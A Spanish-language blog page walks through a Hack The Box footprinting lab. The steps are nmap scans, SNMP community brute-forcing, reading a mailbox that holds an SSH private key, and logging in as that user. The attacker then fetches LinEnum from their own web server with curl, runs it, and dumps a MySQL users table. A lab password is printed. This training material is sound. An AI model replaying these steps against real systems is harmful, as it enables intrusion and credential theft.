@@ -1,0 +1,505 @@
+<!DOCTYPE html>
+<html lang="en-us">
+
+<head><title>
+    
+    Laboratorio De Footprinting - Díficil | 
+    
+    CHL Blog
+</title>
+
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, viewport-fit=cover">
+<link rel="canonical" href="https://chernandez321.github.io/pagina_web/blog/sections/htb/m%C3%B3dulos/laboratorio-de-footprinting---d%C3%ADficil/" />
+<link rel="icon" type="image/png" href="https://chernandez321.github.io/image/favicon.ico">
+
+
+<meta name="description" content="
+    En este laboratorio de footprinting de nivel difícil, analizamos un servidor MX expuesto en la red interna. Mediante técnicas de enumeración activa sobre servicios como IMAPS, SNMP y MySQL, descubrimos credenciales sensibles que nos permitieron acceder por SSH y escalar privilegios a través de la explotación de servicios locales.
+    "
+/>
+<meta property="og:description" content="
+    En este laboratorio de footprinting de nivel difícil, analizamos un servidor MX expuesto en la red interna. Mediante técnicas de enumeración activa sobre servicios como IMAPS, SNMP y MySQL, descubrimos credenciales sensibles que nos permitieron acceder por SSH y escalar privilegios a través de la explotación de servicios locales.
+    " 
+/>
+
+
+
+
+<meta property="og:title" content="Laboratorio de Footprinting - Díficil" />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="https://chernandez321.github.io/pagina_web/blog/sections/htb/m%C3%B3dulos/laboratorio-de-footprinting---d%C3%ADficil/" /><meta property="article:section" content="pagina_web" />
+<meta property="article:published_time" content="2025-04-30T00:00:00+00:00" />
+<meta property="article:modified_time" content="2025-04-30T00:00:00+00:00" />
+
+
+
+
+
+  <meta name="twitter:card" content="summary">
+  <meta name="twitter:title" content="Laboratorio de Footprinting - Díficil">
+  <meta name="twitter:description" content="En este laboratorio de footprinting de nivel difícil, analizamos un servidor MX expuesto en la red interna. Mediante técnicas de enumeración activa sobre servicios como IMAPS, SNMP y MySQL, descubrimos credenciales sensibles que nos permitieron acceder por SSH y escalar privilegios a través de la explotación de servicios locales.">
+
+
+  <meta itemprop="name" content="Laboratorio de Footprinting - Díficil">
+  <meta itemprop="description" content="En este laboratorio de footprinting de nivel difícil, analizamos un servidor MX expuesto en la red interna. Mediante técnicas de enumeración activa sobre servicios como IMAPS, SNMP y MySQL, descubrimos credenciales sensibles que nos permitieron acceder por SSH y escalar privilegios a través de la explotación de servicios locales.">
+  <meta itemprop="datePublished" content="2025-04-30T00:00:00+00:00">
+  <meta itemprop="dateModified" content="2025-04-30T00:00:00+00:00">
+  <meta itemprop="wordCount" content="629">
+  <meta itemprop="keywords" content="HTB,Footprinting,Nmap,Snmp,Ssh,Mysql">
+
+
+
+
+<link rel="stylesheet" href="https://chernandez321.github.io/main.min.css">
+
+
+
+
+
+<script src="https://chernandez321.github.io/bundle.js"></script>
+
+
+
+
+
+
+
+<script data-ad-client="adsense-key" async src="https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
+
+
+
+
+    <script async src="https://www.googletagmanager.com/gtag/js?id=G-A1B2C3D4E5"></script>
+<script>
+  window.dataLayer = window.dataLayer || [];
+  function gtag(){dataLayer.push(arguments);}
+  gtag('js', new Date());
+
+  gtag('config', 'G-A1B2C3D4E5');
+</script>
+
+
+
+
+
+
+</head>
+
+<body><header id="header">
+  <div class="top-bar">
+    <div class="container-md">
+
+      <div class="row align-items-center">
+        <div class="col-3 col-sm-4 social-buttons d-none d-sm-block">
+          <ul>
+    
+    
+
+    
+    <li>
+        <a href="https://www.youtube.com/@CHL_Hands_On" target="_blank">
+            <i class="fab fa-youtube"></i></a>
+    </li>
+    
+
+    
+    <li>
+        <a href="https://www.instagram.com/19chl96/" target="_blank">
+            <i class="fab fa-instagram"></i></a>
+    </li>
+    
+
+    
+    <li>
+        <a href="https://github.com/chernadez321" target="_blank">
+            <i class="fab fa-github"></i></a>
+    </li>
+    
+
+    
+
+    
+    <li>
+        <a href="https://www.linkedin.com/in/chlinked/" target="_blank">
+            <i class="fab fa-linkedin"></i></a>
+    </li>
+    
+
+</ul>
+        </div>
+
+        <div class="ra-toggler col-3 col-sm-4 d-block d-sm-none">
+          <button class="bg-dark" type="button" data-bs-toggle="collapse" data-bs-target="#navbarNav">
+            <i class="fas fa-bars"></i>
+          </button>
+        </div>
+
+        <div class="col-6 col-sm-4">
+          <h2 class="title"><a href="https://chernandez321.github.io/">CHL Blog</a></h2>
+        </div>
+
+        
+        <div class="col-3 col-sm-4">
+          <div class="col col-md-8 offset-md-4 d-none d-sm-block">
+            <form id="cse-search-box-form-id" class="input-group search-bar" onsubmit="return executeQuery('lg');"
+              role="search">
+              <input id="cse-search-input-box-id" type="text" class="form-control" placeholder="Search">
+              <button class="btn" type="submit">
+                <i class="fa fa-search"></i>
+              </button>
+            </form>
+          </div>
+        </div>
+        
+
+      </div>
+    </div>
+  </div>
+
+  <div class="container-md">
+    <nav class="navbar navbar-expand-sm navbar-dark bg-dark sticky-top">
+      <div class="collapse navbar-collapse" id="navbarNav">
+        <ul class="navbar-nav mx-auto">
+
+          <li class="nav-item d-block d-sm-none">
+            <ul class="social-buttons">
+              <ul>
+    
+    
+
+    
+    <li>
+        <a href="https://www.youtube.com/@CHL_Hands_On" target="_blank">
+            <i class="fab fa-youtube"></i></a>
+    </li>
+    
+
+    
+    <li>
+        <a href="https://www.instagram.com/19chl96/" target="_blank">
+            <i class="fab fa-instagram"></i></a>
+    </li>
+    
+
+    
+    <li>
+        <a href="https://github.com/chernadez321" target="_blank">
+            <i class="fab fa-github"></i></a>
+    </li>
+    
+
+    
+
+    
+    <li>
+        <a href="https://www.linkedin.com/in/chlinked/" target="_blank">
+            <i class="fab fa-linkedin"></i></a>
+    </li>
+    
+
+</ul>
+            </ul>
+          </li>
+
+          
+          
+          <li class="nav-item">
+            <a class="nav-link 
+              
+              " 
+              href="https://chernandez321.github.io/">
+              Home
+            </a>
+          </li>
+          
+          
+          
+          <li class="nav-item dropdown">
+            <a class="nav-link dropdown-toggle" href="#" id="navbarDropdown" role="button" data-bs-toggle="dropdown">
+              Blog
+            </a>
+            <div class="dropdown-menu">
+              
+              
+                <a class="dropdown-item" href="https://chernandez321.github.io/pagina_web/blog/posts/">Posts</a>
+              
+              
+              
+                <a class="dropdown-item" href="https://chernandez321.github.io/pagina_web/blog/sections/">Secciones</a>
+              
+              
+              
+                <div class="dropdown-divider"></div>
+              
+              
+              
+                <a class="dropdown-item" href="https://chernandez321.github.io/tags/">Tags</a>
+              
+              
+            </div>
+          </li>
+          
+          
+          
+          <li class="nav-item">
+            <a class="nav-link 
+              
+              " 
+              href="https://chernandez321.github.io/pagina_web/trayectoria/">
+              Trayectoria
+            </a>
+          </li>
+          
+          
+          
+          <li class="nav-item">
+            <a class="nav-link 
+              
+              " 
+              href="https://chernandez321.github.io/pagina_web/contact/">
+              Contacto
+            </a>
+          </li>
+          
+          
+        </ul>
+
+        
+        <form id="cse-search-box-form-id2" class="d-flex search-bar d-block d-sm-none"
+          onsubmit="return executeQuery('xs');" role="search">
+          <input id="cse-search-input-box-id2" type="text" class="form-control" placeholder="Search">
+          <button class="btn" type="submit">
+            <i class="fa fa-search"></i>
+          </button>
+        </form>
+        
+
+      </div>
+    </nav>
+  </div>
+</header>
+
+<main class="blog-content">
+    <div class="container-md">
+        <div class="row">
+            
+            <div class="col-lg-2 d-none d-xl-block">
+                <div class="ad-left-offset"></div>
+                
+            </div>
+
+            <div class="col-md-12 col-lg-8 px-lg-4">
+                
+
+                <h1 class="title">Laboratorio de Footprinting - Díficil</h1>
+
+                <div class="container-fluid px-0 mb-4">
+                    <div class="row align-items-end">
+                        <div class="col-md-4 date-time">
+                            <span class="date">
+    Apr 30, 2025
+</span>
+                            &centerdot;
+                            <span class="time-to-read">
+    3 mins read</span>
+                        </div>
+
+                        <div class="col-md-8 tags ">
+                            
+                            <a href="https://chernandez321.github.io/tags/htb"><span
+                                    class="tag bg-dark">HTB</span></a>
+                            
+                            <a href="https://chernandez321.github.io/tags/footprinting"><span
+                                    class="tag bg-dark">Footprinting</span></a>
+                            
+                            <a href="https://chernandez321.github.io/tags/nmap"><span
+                                    class="tag bg-dark">nmap</span></a>
+                            
+                            <a href="https://chernandez321.github.io/tags/snmp"><span
+                                    class="tag bg-dark">snmp</span></a>
+                            
+                            <a href="https://chernandez321.github.io/tags/ssh"><span
+                                    class="tag bg-dark">ssh</span></a>
+                            
+                            <a href="https://chernandez321.github.io/tags/mysql"><span
+                                    class="tag bg-dark">mysql</span></a>
+                            
+                        </div>
+                    </div>
+                </div>
+
+                
+
+                <h4 id="enunciado">Enunciado</h4>
+<p>Este es un servidor MX y de administración para la red interna. Este servidor también funciona como servidor de respaldo para las cuentas internas del dominio.
+Por lo tanto, también se creó aquí un usuario llamado <code>HTB</code>, y necesitamos sus credenciales.</p>
+<h4 id="enumeración">Enumeración</h4>
+<p>Vamos con lo básico a ver qué servicios están corriendo sobre el servidor.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>nmap -p- -sS --min-rate <span style="color:#ae81ff">2000</span> -n -Pn &lt;IP&gt;
+</span></span></code></pre></div><p><img src="../../../../../images/HTB_modulos/footprinting_htb_labs_3/d%C3%ADficil1.png" alt=""></p>
+<p>Ahora vamos a ver con un poco más de detalle que hay corriendo en cada puerto que nos salió a ver si vemos algo interesante.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>nmap -22,110,143,993,995 -sCV -n -Pn &lt;IP&gt;
+</span></span></code></pre></div><p><img src="../../../../../images/HTB_modulos/footprinting_htb_labs_3/d%C3%ADficil2.png" alt=""></p>
+<p><img src="../../../../../images/HTB_modulos/footprinting_htb_labs_3/d%C3%ADficil3.png" alt=""></p>
+<p>Luego de realizar scripts en <code>TCP</code> para recopilar más información sobre los servicios y veo que no pude avanzar mucho mas dado que tanto en pop como imap para poder listar correos necesito alguna credencial y por ssh no tengo claves tampoco, escaneamos por <code>UDP</code> para ver si encontramos algo.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>nmap -sU --top-port <span style="color:#ae81ff">100</span> 10.129.5.201
+</span></span></code></pre></div><p><img src="../../../../../images/HTB_modulos/footprinting_htb_labs_3/d%C3%ADficil4.png" alt=""></p>
+<p>Y vemos que tenemos 2 servicios más. Vamos a enumerarlos más en detalle:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>nmap -sUCV -p68,161 10.129.5.201
+</span></span></code></pre></div><p><img src="../../../../../images/HTB_modulos/footprinting_htb_labs_3/d%C3%ADficil5.png" alt=""></p>
+<p>Vemos que en puerto 161 está usando snmp de versión 3.
+Recordemos que <strong>SNMP</strong> - Es un protocolo usado para supervisar y gestionar dispositivos de red.
+Con la herramienta onesixtyone vemos si podemos obtener información</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>onesixtyone -c /usr/share/seclists/Discovery/SNMP/snmp.txt &lt;IP&gt;
+</span></span></code></pre></div><p><img src="../../../../../images/HTB_modulos/footprinting_htb_labs_3/d%C3%ADficil6.png" alt="">
+Y obtenemos la cadena de comunidad backup que podemos usar con <code>snmpwalk</code> para obtener más información.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>snmpwalk -v 2c -c backup &lt;IP&gt;
+</span></span></code></pre></div><p><img src="../../../../../images/HTB_modulos/footprinting_htb_labs_3/d%C3%ADficil7.png" alt=""></p>
+<p>Y vemos a continuación como unos intentos de cambiar la contraseña del usuario <code>tom</code></p>
+<p><img src="../../../../../images/HTB_modulos/footprinting_htb_labs_3/d%C3%ADficil8.png" alt=""></p>
+<p>Vale a priori al menos tenemos un usuario, vamos a intentar acceder a imap o pop.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>openssl s_client -connect &lt;IP&gt;:993 -crlf -quiet
+</span></span></code></pre></div><p><img src="../../../../../images/HTB_modulos/footprinting_htb_labs_3/d%C3%ADficil9.png" alt="">
+y efectivamente vemos que nos podemos acceder.
+Listamos los buzones del correo del usuario y vemos varios. <code>a LIST &quot;&quot; * </code></p>
+<p><img src="../../../../../images/HTB_modulos/footprinting_htb_labs_3/d%C3%ADficil10.png" alt=""></p>
+<p>Al ir entrando en cada uno vemos que en <code>INBOX</code> tenemos un correo. <code>a SELECT INBOX </code>
+Abrimos el correo <code>a fetch 1 body[]</code> y vemos que es un correo del admin para tom donde le está pasando su clave ssh privada, la cual podemos copiar y usar para poder acceder al sistema como dicho usuario.</p>
+<p><img src="../../../../../images/HTB_modulos/footprinting_htb_labs_3/d%C3%ADficil11.png" alt=""></p>
+<p>Ahora básicamente copiamos la clave en un archivo que creamos en local con nombre <code>id_rsa</code> lo pegamos y le otorgamos permisos 600
+<code>chmod 600 id_rsa</code></p>
+<p>Ahora vamos a utilizar la clave para acceder:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>ssh -i id_rsa tom@&lt;IP&gt;
+</span></span></code></pre></div><p>Vale ya dentro vamos a proceder  a pasar un script de reconocimiento de Linux donde nos va a mostrar información del equipo y con ella intentar escalar privilegios.</p>
+<p>Primero nos descargamos el script LinEnum.sh a local con el comando</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>wget https://raw.githubusercontent.com/rebootuser/LinEnum/refs/heads/master/LinEnum.sh
+</span></span></code></pre></div><p>Luego en la carpeta donde nos descargamos el script montamos un servidor web para transferirlo a la máquina víctima.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>python3 <span style="color:#f92672">-</span>m http<span style="color:#f92672">.</span>server <span style="color:#ae81ff">8000</span>
+</span></span></code></pre></div><p>Ahora en la máquina víctima hacemos un curl al servidor web de la siguiente forma:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>curl http://&lt;IP&gt;:8000/LinEnum.sh -o script.sh
+</span></span></code></pre></div><p>Recordar la IP es la de la interfaz de Hack the Box.</p>
+<p>Luego en la máquina víctima le damos permisos de ejecución al script</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>chmod +x script.sh
+</span></span></code></pre></div><p>Y lo ejecutamos</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>./script.sh
+</span></span></code></pre></div><p>Mostrando lo siguiente:
+<img src="../../../../../images/HTB_modulos/footprinting_htb_labs_3/d%C3%ADficil12.png" alt="">
+Y vemos esto que tenemos con el usuario tom cierto privilegio con el servicio mysql.
+<img src="../../../../../images/HTB_modulos/footprinting_htb_labs_3/d%C3%ADficil13.png" alt="">
+Vemos si está corriendo el servicio y sí está corriendo.
+<img src="../../../../../images/HTB_modulos/footprinting_htb_labs_3/d%C3%ADficil14.png" alt="">
+Vemos donde está ubicado para llamarlo y ejecutarlo:
+<img src="../../../../../images/HTB_modulos/footprinting_htb_labs_3/d%C3%ADficil15.png" alt="">
+Ejecutamos el comando:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#75715e">#/usr/bin/mysql Este da error porque debemos especificar la contraseña.</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>/usr/bin/mysql -p <span style="color:#75715e">#Ponemos a continuación el password del usuario tom &#39;NMds732Js2761&#39;</span>
+</span></span></code></pre></div><p><img src="../../../../../images/HTB_modulos/footprinting_htb_labs_3/d%C3%ADficil16.png" alt="">Y podemos acceder a mysql</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-mysql" data-lang="mysql"><span style="display:flex;"><span><span style="color:#66d9ef">show</span> <span style="color:#66d9ef">databases</span>;
+</span></span></code></pre></div><p><img src="../../../../../images/HTB_modulos/footprinting_htb_labs_3/d%C3%ADficil17.png" alt="">
+Seleccionamos la base de datos users:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-mysql" data-lang="mysql"><span style="display:flex;"><span><span style="color:#66d9ef">use</span> users;
+</span></span></code></pre></div><p><img src="../../../../../images/HTB_modulos/footprinting_htb_labs_3/d%C3%ADficil18.png" alt="">
+Vemos su contendido  y nos damos cuenta que hay muchos usuarios en dicha tabla:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-mysql" data-lang="mysql"><span style="display:flex;"><span><span style="color:#66d9ef">select</span> <span style="color:#f92672">*</span> <span style="color:#66d9ef">from</span> users;
+</span></span></code></pre></div><p><img src="../../../../../images/HTB_modulos/footprinting_htb_labs_3/d%C3%ADficil19.png" alt="">
+Y con la siguiente query encontramos el usuario deseado</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-mysql" data-lang="mysql"><span style="display:flex;"><span><span style="color:#66d9ef">select</span> <span style="color:#f92672">*</span> <span style="color:#66d9ef">from</span> users <span style="color:#66d9ef">where</span> username <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;HTB&#39;</span>;
+</span></span></code></pre></div><p><img src="../../../../../images/HTB_modulos/footprinting_htb_labs_3/d%C3%ADficil20.png" alt=""></p>
+<p>Si te sirvió de algo este tutorial ya para mi es más que suficiente, si me puedes decir en que podemos mejorar te lo voy a agradecer un montón.</p>
+
+
+                <div id="social-media-share">
+	<p><i>Escríbeme por cualquiera de las vías</i></p>
+	
+	<div class="share-buttons">
+	    
+		<a href="https://www.instagram.com/19chl96/" 
+   			target="_blank" 
+   			title="Sígueme en Instagram">
+    		<img src=https://chernandez321.github.io/icons/45px/instagram.png alt="Instagram">
+		</a>
+
+		<a  href="https://www.linkedin.com/in/chlinked/"
+	        onclick="socialMediaPopUp(this.href, '', 900, 500); return false;"
+	        title="Share on LinkedIn. Opens in a new window." >
+	        <img src=https://chernandez321.github.io/icons/48px/linkedin.png>
+	    </a>
+
+	    <a href="https://mail.google.com/mail/?view=cm&fs=1&to=chlorenzo96@gmail.com&su=Para Carlos&body=Hola." 
+   		   target="_blank" 
+   		   title="Enviar correo usando Gmail">
+    	<img src=https://chernandez321.github.io/icons/48px/email.png alt="Email">
+		</a>
+
+		
+
+	</div>
+</div>
+
+
+
+                
+                <br>
+                <div id="disqus_thread"></div>
+<script type="text/javascript">
+    (function () {
+        
+        
+        if (window.location.hostname == "localhost")
+            return;
+
+        var dsq = document.createElement('script'); dsq.type = 'text/javascript'; dsq.async = true;
+        var disqus_shortname = '';
+        dsq.src = '//' + disqus_shortname + '.disqus.com/embed.js';
+        (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
+    })();
+</script>
+<noscript>Please enable JavaScript to view the <a href="http://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
+            </div>
+
+            <div class="col-lg-2 d-none d-xl-block">
+                <div class="ad-right-offset"></div>
+                
+            </div>
+        </div>
+    </div>
+</main>
+
+<footer class="bg-dark text-light py-4">
+    <div class="container-md">
+        <div class="row justify-content-center">
+            <div class="col-12">
+                <nav class="navbar navbar-expand-sm navbar-dark bg-dark justify-content-center">
+                    <ul class="navbar-nav">
+                        <li class="nav-item">
+                            <a class="nav-link" href="https://chernandez321.github.io/">Home</a>
+                        </li>
+                        <li class="nav-item">
+                            <a class="nav-link" href="https://chernandez321.github.io/pagina_web/blog/posts/">Posts</a>
+                        </li>
+                        <li class="nav-item">
+                            <a class="nav-link" href="https://chernandez321.github.io/pagina_web/blog/sections/">Secciones</a>
+                        </li>
+                    </ul>
+                </nav>
+            </div>
+        </div>
+    </div>
+    <div class="text-center mt-3">
+        <p>
+            
+                © 2024 Carlos Hernández Lorenzo
+            
+        </p>
+    </div>
+</footer>
+
+
+<script async src="https://cse.google.com/cse.js?cx=google-cse-key"></script>
+<gcse:searchresults-only></gcse:searchresults-only>
+
+</body>
+
+</html>
